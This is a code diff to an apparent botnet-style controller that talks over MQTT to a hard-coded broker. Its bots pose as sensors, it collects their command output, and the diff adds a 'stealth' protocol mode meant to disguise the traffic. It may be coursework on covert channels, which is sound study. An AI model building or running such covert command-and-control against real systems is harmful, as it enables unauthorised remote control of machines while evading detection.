@@ -5,7 +5,9 @@ import random
 import time
 import paho.mqtt.client as mqtt
 import json
-from protocol import ProtocolStack
+from protocol import ProtocolStack, StealthProtocolStack, deserialize_packet
+
+import os
 
 # --- CONFIGURATION ---
 BROKER = "147.32.82.209"
@@ -14,6 +16,8 @@ TOPIC = "sensors"
 SALT = "S4ur0ns_S3cr3t_S4lt_2025"
 SEND_INTERVAL = 1.0
 ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
+USE_STEALTH_MODE = os.environ.get("USE_STEALTH_MODE", "True").lower() == "true"
+DEBUG = os.environ.get("DEBUG", "True").lower() == "true"
 
 # Track discovered bots
 discovered_bots = set()
@@ -25,7 +29,8 @@ def scan_existing_ids(broker: str, port: int, topic: str, scan_time: float) -> s
     
     def on_message(client, userdata, msg):
         try:
-            data = json.loads(msg.payload.decode())
+            # Use protocol deserializer instead of json.loads
+            data = deserialize_packet(msg.payload)
             sensor_id = data.get("sensor_id", "")
             if sensor_id.startswith("sensor_"):
                 existing_ids.add(sensor_id)
@@ -65,13 +70,14 @@ def handle_message(message: dict):
     sender = message.get("sender")
     
     # Track any bot that responds
-    if sender and sender.startswith("sensor_") and not sender.endswith("1"):
+    # Track any bot that responds
+    if sender:
         discovered_bots.add(sender)
     
     # Only handle responses targeted at us
     if msg_type != "response":
         return
-    if target != CONTROLLER_ID:
+    if target != "ME":
         return
     
     output = message.get("output", "")
@@ -125,14 +131,18 @@ if __name__ == "__main__":
     CONTROLLER_ID = generate_unique_hub_id(existing_ids)
     
     # Create and start protocol stack
-    stack = ProtocolStack(
+    StackClass = StealthProtocolStack if USE_STEALTH_MODE else ProtocolStack
+    stack = StackClass(
         node_id=CONTROLLER_ID,
         broker=BROKER,
         port=PORT,
         topic=TOPIC,
         salt=SALT,
-        send_interval=SEND_INTERVAL
+        send_interval=SEND_INTERVAL,
+        debug=DEBUG
     )
+    
+    mode_str = "STEALTH" if USE_STEALTH_MODE else "FINGERPRINT"
     
     # Register message handler
     stack.on_receive(handle_message)
